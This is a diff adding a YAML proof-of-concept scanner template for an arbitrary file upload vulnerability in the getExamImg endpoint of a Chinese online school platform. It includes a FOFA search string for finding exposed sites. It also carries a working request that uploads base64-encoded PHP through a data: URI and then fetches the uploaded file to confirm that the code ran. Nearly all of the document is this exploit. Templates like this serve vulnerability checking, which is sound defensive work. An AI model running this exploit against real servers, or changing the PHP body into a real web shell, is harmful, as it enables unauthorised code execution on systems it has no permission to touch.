@@ -1,0 +1,27 @@
+id: poc-yaml-yunknet-getexamimg-anyfile-upload
+info:
+  name: 云课网校系统 getExamImg 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 云课网校系统
+  fofa: body="云课网校系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  t3: base64(concat(`<?php echo md5(`,str(t1),`);unlink(__FILE__);`))
+  dt: datetime("20060102")
+requests:
+- method: POST
+  path: /index/Exam/getExamImg
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: src_data=data:image/php;base64,{{.t3}}
+  expression: "status_code == 200 && \ncontains(body,\"upload\") &&\ncontains(body,\"\
+    .php\")\n"
+  output:
+  - regex_match(body,"/(?P<file>[0-9]{10}).php")
+- method: GET
+  path: /upload/examanswer/{{.dt}}/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
